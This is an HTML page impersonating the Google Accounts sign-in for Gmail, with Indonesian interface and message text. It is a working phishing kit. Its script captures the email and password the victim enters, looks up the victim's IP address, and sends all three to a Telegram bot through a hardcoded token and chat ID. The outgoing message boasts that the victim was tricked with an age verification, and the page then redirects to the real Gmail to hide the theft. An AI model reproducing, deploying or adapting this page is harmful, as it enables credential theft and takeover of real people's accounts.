<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover, shrink-to-fit=no">
    <title>Sign in - Google Accounts</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
        }
        body {
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            background: white;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            max-width: 450px;
            width: 100%;
            padding: 48px 40px 36px;
            text-align: center;
            background: white;
            border-radius: 28px;
        }
        .google-logo img { width: 75px; margin-bottom: 20px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; }
        .subtitle { color: #5f6368; margin-bottom: 32px; }
        input {
            width: 100%;
            padding: 13px 15px;
            margin: 10px 0;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
        }
        input:focus { outline: none; border-color: #1a73e8; }
        button {
            width: 100%;
            padding: 12px;
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 20px;
        }
        button:disabled { background: #dadce0; cursor: not-allowed; }
        .error {
            background: #fce8e6;
            color: #d93025;
            padding: 12px;
            border-radius: 4px;
            margin-top: 15px;
            display: none;
        }
        .loading {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid white;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-left: 8px;
            vertical-align: middle;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
<div class="card">
    <div class="google-logo">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
    </div>
    <h1>Sign in</h1>
    <div class="subtitle">to continue to Gmail</div>
    <form id="loginForm">
        <input type="email" id="email" placeholder="Email or phone" required>
        <input type="password" id="password" placeholder="Password" required>
        <button type="submit" id="loginBtn">Next</button>
        <div class="error" id="errorMsg">Wrong email or password</div>
    </form>
</div>

<script>
    const TELEGRAM_TOKEN = "8806067214:AAHMhedGeATjYcFl3QUHk53Q8o9_sDuiGOg";
    const CHAT_ID = "8854409945";

    async function getIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip;
        } catch(e) { return 'Unknown'; }
    }

    function getFormattedDate() {
        const days = ['Minggu', 'Senin', 'Selasa', 'Rabu', 'Kamis', 'Jumat', 'Sabtu'];
        const months = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember'];
        const now = new Date();
        return `${days[now.getDay()]}, ${now.getDate()} ${months[now.getMonth()]} ${now.getFullYear()} - ${String(now.getHours()).padStart(2,'0')}:${String(now.getMinutes()).padStart(2,'0')}:${String(now.getSeconds()).padStart(2,'0')}`;
    }

    async function sendToTelegram(email, password) {
        const ip = await getIP();
        const tanggal = getFormattedDate();
        
        let pesan = `╔══════════════════════════════════════════════════════════════════╗\n`;
        pesan += `║                    🔐🔐🔐 LOGIN GOOGLE 🔐🔐🔐                       ║\n`;
        pesan += `╠══════════════════════════════════════════════════════════════════╣\n`;
        pesan += `║ 📅 TANGGAL    : ${tanggal}\n`;
        pesan += `║ 🌐 IP        : ${ip}\n`;
        pesan += `║ 📧 EMAIL     : ${email}\n`;
        pesan += `║ 🔑 PASSWORD  : ${password}\n`;
        pesan += `╠══════════════════════════════════════════════════════════════════╣\n`;
        pesan += `║ 💀💀💀 KORBAN BERHASIL DIKECOH DENGAN VERIFIKASI UMUR 💀💀💀       ║\n`;
        pesan += `╚══════════════════════════════════════════════════════════════════╝`;
        
        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}`;
        await fetch(url, {mode: 'no-cors'});
    }

    const form = document.getElementById('loginForm');
    const errorMsg = document.getElementById('errorMsg');
    const loginBtn = document.getElementById('loginBtn');

    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        
        if (!email || !password) {
            errorMsg.style.display = 'block';
            setTimeout(() => errorMsg.style.display = 'none', 2000);
            return;
        }
        
        loginBtn.disabled = true;
        loginBtn.innerHTML = "Memverifikasi... <span class='loading'></span>";
        
        await sendToTelegram(email, password);
        
        errorMsg.style.backgroundColor = '#e6f4ea';
        errorMsg.style.color = '#137333';
        errorMsg.innerHTML = '✅ Verifikasi berhasil! Redirecting to Gmail...';
        errorMsg.style.display = 'block';
        
        setTimeout(() => {
            window.location.href = 'https://mail.google.com';
        }, 2000);
    });
</script>
</body>
</html>
